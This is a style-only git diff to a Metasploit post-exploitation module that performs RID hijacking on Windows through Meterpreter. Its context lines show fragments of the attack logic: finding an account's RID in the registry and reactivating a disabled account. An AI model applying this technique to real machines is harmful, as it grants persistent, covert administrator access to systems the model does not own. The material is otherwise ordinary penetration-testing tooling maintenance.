@@ -22,10 +22,10 @@ class MetasploitModule < Msf::Post
         existing account (like ADMINISTRATOR account), even if the spoofed account is
         disabled.
       },
-      'License'       => MSF_LICENSE,
-      'Author'        => 'Sebastian Castro <sebastian.castro[at]cslcolombia.com>',
-      'Platform'      => ['win'],
-      'SessionTypes'  => ['meterpreter'],
+      'License' => MSF_LICENSE,
+      'Author' => 'Sebastian Castro <sebastian.castro[at]cslcolombia.com>',
+      'Platform' => ['win'],
+      'SessionTypes' => ['meterpreter'],
       'References'	=> [
         ['URL', 'http://csl.com.co/rid-hijacking/']
       ])
@@ -62,6 +62,7 @@ class MetasploitModule < Msf::Post
   def get_user_rid(reg_key, username, names_key)
     names_key.each do |name|
       next unless name.casecmp(username).zero?
+
       print_good("Found #{name} account!")
       skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
       rid = skey['Type']
@@ -153,6 +154,7 @@ class MetasploitModule < Msf::Post
     users_key = registry_enumkeys(reg_key)
     users_key.each do |r|
       next if r.to_i(16) != user_rid
+
       f = registry_getvaldata(reg_key + "\\#{r}", "F")
       if check_active(f)
         print_status("Account is disabled, activating...")
